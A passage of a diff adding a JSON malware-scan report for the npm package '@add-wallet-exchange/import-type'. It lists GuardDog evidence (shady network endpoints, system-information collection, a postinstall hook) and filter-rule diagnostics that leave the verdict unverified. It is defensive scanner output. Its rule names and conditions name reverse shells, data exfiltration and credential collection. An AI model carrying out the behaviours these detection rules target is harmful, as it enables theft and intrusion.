+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.shady-link",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SUSPICIOUS_NETWORK_ENDPOINT",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-outbound-shady-links",
+              "rawFindingId": "guarddog:threat-network-outbound-shady-links:1"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 15
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A static endpoint indicator does not prove successful communication, exfiltration, or command-and-control activity."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00021",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.shady-link",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SUSPICIOUS_NETWORK_ENDPOINT",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-outbound-shady-links",
+              "rawFindingId": "guarddog:threat-network-outbound-shady-links:2"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 15
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A static endpoint indicator does not prove successful communication, exfiltration, or command-and-control activity."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00022",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.shady-link",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SUSPICIOUS_NETWORK_ENDPOINT",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-outbound-shady-links",
+              "rawFindingId": "guarddog:threat-network-outbound-shady-links:3"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 15
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A static endpoint indicator does not prove successful communication, exfiltration, or command-and-control activity."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00023",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.runtime.system-info",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "SYSTEM_INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects active collection of system information (hostname, platform, architecture, user)",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-runtime-system-info",
+              "rawFindingId": "guarddog:threat-runtime-system-info:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 8
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A GuardDog static finding indicates observable code capability or a threat pattern, not runtime execution."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00024",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.runtime.system-info",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "SYSTEM_INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects active collection of system information (hostname, platform, architecture, user)",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-runtime-system-info",
+              "rawFindingId": "guarddog:threat-runtime-system-info:1"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 6
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A GuardDog static finding indicates observable code capability or a threat pattern, not runtime execution."
+          ]
+        }
+      ],
+      "unmappedFindings": [],
+      "errors": [],
+      "summary": {
+        "inputFindingCount": 21,
+        "normalizedFindingCount": 21,
+        "atomicEvidenceCount": 24,
+        "unmappedFindingCount": 0,
+        "invalidFindingCount": 0,
+        "deduplicatedEvidenceCount": 0,
+        "normalizerVersion": "0.1.0",
+        "mappingVersion": "0.5.0",
+        "mappingHash": "fa68823d2aef2f2eff84afe99a6110007bf7716ab68eb6559e461c47729aade7"
+      }
+    }
+  },
+  "filterResult": {
+    "status": "STATIC_INCOMPLETE",
+    "ruleVersion": "0.1.0",
+    "appliedRuleIds": [
+      "A05",
+      "A06",
+      "A09",
+      "I08"
+    ],
+    "reasonCodes": [
+      "BEHAVIOR_LINK_UNVERIFIED",
+      "LIFECYCLE_LINK_UNVERIFIED",
+      "RELATION_CANDIDATE_UNVERIFIED",
+      "UNCLASSIFIED_THREAT_REVIEW_REQUIRED",
+      "SCAN_COVERAGE_UNKNOWN"
+    ],
+    "findingRefs": [
+      {
+        "analyzer": "metadata",
+        "findingId": "metadata:metadata.lifecycle.postinstall:0"
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:capability-network-download:0"
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:capability-network-outbound:0"
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:threat-network-exfil-sysinfo:0"
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:threat-network-exfil-sysinfo:1"
+      },
+      {
+        "analyzer": "guarddog",
+        "findingId": "guarddog:threat-network-exfil-sysinfo:2"
+      },
+      {
+        "analyzer": "custom-rule",
+        "findingId": "custom-rule:custom.collection-source:0"
+      },
+      {
+        "analyzer": "custom-rule",
+        "findingId": "custom-rule:custom.collection-source:1"
+      },
+      {
+        "analyzer": "custom-rule",
+        "findingId": "custom-rule:custom.collection-source:2"
+      },
+      {
+        "analyzer": "custom-rule",
+        "findingId": "custom-rule:custom.collection-source:3"
+      },
+      {
+        "analyzer": "custom-rule",
+        "findingId": "custom-rule:custom.network-outbound:5"
+      }
+    ],
+    "evidenceRefs": [
+      {
+        "evidenceId": "DD-NPM-002-evidence-00001"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00011"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00012"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00013"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00014"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00015"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00016"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00017"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00018"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00002"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00003"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00004"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00005"
+      },
+      {
+        "evidenceId": "DD-NPM-002-evidence-00007"
+      }
+    ],
+    "diagnostics": [
+      {
+        "ruleId": "M01",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-network-reverse-shell)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "VALID",
+            "status": "NOT_SATISFIED",
+            "detail": "Required Finding validity is not established"
+          },
+          {
+            "condition": "ACTUAL_SHELL_CONNECTION_COMMAND",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "EXECUTION_CALL_OR_SCRIPT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M02",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-filesystem-destruction)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-process-spawn)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "SAME_FILE",
+            "status": "UNVERIFIED",
+            "detail": "Same-file provenance is not established"
+          },
+          {
+            "condition": "VALID",
+            "status": "NOT_SATISFIED",
+            "detail": "Required Finding validity is not established"
+          },
+          {
+            "condition": "IMPORTANT_PATH_DESTRUCTION",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "DESTRUCTION_TO_EXECUTION_INPUT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M03",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-filesystem-read)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-filesystem-read)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-network-outbound)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "VALID",
+            "status": "SATISFIED",
+            "detail": "Required Findings have context and valid provenance"
+          },
+          {
+            "condition": "SENSITIVE_CONTENT_TO_EXTERNAL_REQUEST_DATA",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-outbound:0"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00012"
+          }
+        ],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M04",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-runtime-environment-read)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-network-outbound)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "VALID",
+            "status": "SATISFIED",
+            "detail": "Required Findings have context and valid provenance"
+          },
+          {
+            "condition": "CREDENTIAL_OR_FULL_ENV_COLLECTION",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "EXTERNAL_EXFILTRATION_CONTEXT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-outbound:0"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00012"
+          }
+        ],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M05",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-network-dns-exfil OR threat-network-exfil-messenger)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "VALID",
+            "status": "NOT_SATISFIED",
+            "detail": "Required Finding validity is not established"
+          },
+          {
+            "condition": "M03_OR_M04_SENSITIVE_COLLECTION",
+            "status": "UNVERIFIED",
+            "detail": "Sensitive collection must be scoped independently from complete M03/M04 confirmation"
+          },
+          {
+            "condition": "COLLECTED_DATA_TO_EXFIL_CONTENT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic data-flow assertion"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M06",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-process-download-exec)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-network-download)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "HIT(capability-process-spawn)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "VALID",
+            "status": "SATISFIED",
+            "detail": "Required Findings have context and valid provenance"
+          },
+          {
+            "condition": "DOWNLOAD_RESULT_TO_EXECUTION_INPUT",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "PAYLOAD_HAS_SCOPED_M01_TO_M05",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-download:0"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00011"
+          }
+        ],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M07",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-process-hooks)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "VALID",
+            "status": "NOT_SATISFIED",
+            "detail": "Required Finding validity is not established"
+          },
+          {
+            "condition": "SCOPED_M01_TO_M06_SATISFIED",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "LIFECYCLE_TO_MALICIOUS_CODE_CALL",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "M08",
+        "category": "MALICIOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-runtime-self-propagation)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-process-spawn)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "VALID",
+            "status": "NOT_SATISFIED",
+            "detail": "Required Finding validity is not established"
+          },
+          {
+            "condition": "SCOPED_M01_TO_M05_CODE_INSERTION",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          },
+          {
+            "condition": "INSERTION_TO_PUBLISH",
+            "status": "UNVERIFIED",
+            "detail": "AgentPlanningInputV0_1 has no verified semantic execution/data-flow assertion for this condition"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A01",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "PREFIX(threat-runtime-obfuscation) + RELATED_RESTORE_PROBLEM",
+            "status": "NOT_SATISFIED",
+            "detail": "Exact path/provenance mapping is required"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A02",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-filesystem-read)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-network-outbound)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "COLLECTED_DATA_TO_NETWORK",
+            "status": "UNVERIFIED",
+            "detail": "No verified data-flow assertion is present"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A03",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-runtime-environment-read)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "HIT(capability-network-outbound)",
+            "status": "SATISFIED",
+            "detail": "1 exact Raw Finding hit(s)"
+          },
+          {
+            "condition": "ENV_DATA_TO_NETWORK",
+            "status": "UNVERIFIED",
+            "detail": "No verified data-flow assertion is present"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A04",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "DOWNLOAD_EXECUTION_REQUIRED_HITS",
+            "status": "NOT_SATISFIED",
+            "detail": "Raw rule combinations only"
+          },
+          {
+            "condition": "DOWNLOAD_TO_EXECUTION_OR_PAYLOAD_MALICE",
+            "status": "UNVERIFIED",
+            "detail": "No verified payload linkage/content is present"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A05",
+        "category": "AMBIGUOUS",
+        "outcome": "UNVERIFIED",
+        "conditions": [
+          {
+            "condition": "LIFECYCLE_FINDING",
+            "status": "SATISFIED",
+            "detail": "Threat hook, preinstall, or metadata lifecycle Finding"
+          },
+          {
+            "condition": "PROCESS_NETWORK_OR_SENSITIVE_FINDING",
+            "status": "SATISFIED",
+            "detail": "Uses the documented static-filter behavior rule list"
+          },
+          {
+            "condition": "LIFECYCLE_CALL_LINK",
+            "status": "UNVERIFIED",
+            "detail": "Coexistence does not prove invocation"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "metadata",
+            "findingId": "metadata:metadata.lifecycle.postinstall:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-download:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:capability-network-outbound:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:1"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:2"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00001"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00011"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00012"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00013"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00014"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00015"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00016"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00017"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00018"
+          }
+        ],
+        "blockingConditions": [
+          "LIFECYCLE_LINK_UNVERIFIED"
+        ]
+      },
+      {
+        "ruleId": "A06",
+        "category": "AMBIGUOUS",
+        "outcome": "UNVERIFIED",
+        "conditions": [
+          {
+            "condition": "EXFILTRATION_THREAT_HIT",
+            "status": "SATISFIED",
+            "detail": "DNS, messenger, sysinfo, or generic exfiltration exact rule hit"
+          },
+          {
+            "condition": "SENSITIVE_DATA_AND_DESTINATION_LINK",
+            "status": "UNVERIFIED",
+            "detail": "Transfer content and target are not linked"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:0"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:1"
+          },
+          {
+            "analyzer": "guarddog",
+            "findingId": "guarddog:threat-network-exfil-sysinfo:2"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00013"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00014"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00015"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00016"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00017"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00018"
+          }
+        ],
+        "blockingConditions": [
+          "BEHAVIOR_LINK_UNVERIFIED"
+        ]
+      },
+      {
+        "ruleId": "A07",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "DUAL_USE_THREAT_HIT",
+            "status": "NOT_SATISFIED",
+            "detail": "Keylogging, screen capture, memory, cryptomining, autostart, or DLL injection"
+          },
+          {
+            "condition": "ABUSE_OR_BENIGN_CONTEXT",
+            "status": "UNVERIFIED",
+            "detail": "Intent/context is not established"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A08",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "HIT(threat-runtime-self-propagation)",
+            "status": "NOT_SATISFIED",
+            "detail": "No exact Raw Finding hit"
+          },
+          {
+            "condition": "INSERTION_TO_PUBLISH_LINK",
+            "status": "UNVERIFIED",
+            "detail": "Propagation chain is not established"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "A09",
+        "category": "AMBIGUOUS",
+        "outcome": "UNVERIFIED",
+        "conditions": [
+          {
+            "condition": "RELATION_CANDIDATE_PRESENT",
+            "status": "SATISFIED",
+            "detail": "Candidates remain unverified even when referenced Findings exist"
+          }
+        ],
+        "linked": {
+          "required": true,
+          "status": "UNVERIFIED",
+          "basis": []
+        },
+        "findingRefs": [
+          {
+            "analyzer": "custom-rule",
+            "findingId": "custom-rule:custom.collection-source:0"
+          },
+          {
+            "analyzer": "custom-rule",
+            "findingId": "custom-rule:custom.collection-source:1"
+          },
+          {
+            "analyzer": "custom-rule",
+            "findingId": "custom-rule:custom.collection-source:2"
+          },
+          {
+            "analyzer": "custom-rule",
+            "findingId": "custom-rule:custom.collection-source:3"
+          },
+          {
+            "analyzer": "custom-rule",
+            "findingId": "custom-rule:custom.network-outbound:5"
+          }
+        ],
+        "evidenceRefs": [
+          {
+            "evidenceId": "DD-NPM-002-evidence-00002"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00003"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00004"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00005"
+          },
+          {
+            "evidenceId": "DD-NPM-002-evidence-00007"
+          }
+        ],
+        "blockingConditions": [
+          "RELATION_CANDIDATE_IS_NOT_VERIFIED"
+        ]
+      },
+      {
+        "ruleId": "A10",
+        "category": "AMBIGUOUS",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "SEMANTIC_REPRESENTATION_CONFLICT",
+            "status": "UNVERIFIED",
+            "detail": "Current input has no semantic conflict assertion; Finding count/rule differences are insufficient"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": [
+          "REPRESENTATION_CONFLICT_CANNOT_BE_DERIVED"
+        ]
+      },
+      {
+        "ruleId": "I01",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "ANALYZER_INCOMPLETE",
+            "status": "NOT_SATISFIED",
+            "detail": "FAILED/TIMEOUT/PARTIAL or analyzer errors; affected scope cannot be proven irrelevant"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I02",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "REQUIRED_FINDING_CONTEXT_MISSING",
+            "status": "NOT_SATISFIED",
+            "detail": "Relevant Finding lacks location or structured data context"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I03",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
+            "condition": "RELEVANT_FINDING_UNAVAILABLE_TO_FILTER",
+            "status": "NOT_SATISFIED",
+            "detail": "0 relevant unmapped item(s) lack a matching Raw Finding"
+          }
+        ],
+        "linked": {
+          "required": false,
+          "status": "NOT_REQUIRED",
+          "basis": []
+        },
+        "findingRefs": [],
+        "evidenceRefs": [],
+        "blockingConditions": []
+      },
+      {
+        "ruleId": "I04",
+        "category": "INCOMPLETE",
+        "outcome": "NOT_APPLICABLE",
+        "conditions": [
+          {
